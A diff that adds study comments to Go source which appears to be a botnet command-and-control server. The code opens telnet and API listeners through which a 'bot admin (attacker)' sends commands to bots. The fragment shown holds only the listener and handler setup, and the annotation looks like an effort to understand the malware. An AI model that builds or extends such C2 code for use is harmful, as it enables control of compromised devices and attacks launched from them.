@@ -1,3 +1,13 @@
+/*
+1st, settup Telnet server and API server, 
+2 ways to communicate with bots,
+    1. API handler
+    2. telnet
+need to authenticate in both ways.
+
+
+*/
+
 package main
 
 import (
@@ -16,24 +26,28 @@ var clientList *ClientList = NewClientList()
 var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)
 
 func main() {
+    // open telnet port
     tel, err := net.Listen("tcp", "0.0.0.0:23")
     if err != nil {
         fmt.Println(err)
         return
     }
 
+    // this port is for API(?)
     api, err := net.Listen("tcp", "0.0.0.0:101")
     if err != nil {
         fmt.Println(err)
         return
     }
 
+    // asynchronous process, waiting for connection response
     go func() {
         for {
             conn, err := api.Accept()
             if err != nil {
                 break
             }
+            // initialize API handler
             go apiHandler(conn)
         }
     }()
@@ -85,6 +99,7 @@ func initialHandler(conn net.Conn) {
     }
 }
 
+// the handler is for receiving command from bot admin (attacker)
 func apiHandler(conn net.Conn) {
     defer conn.Close()
 
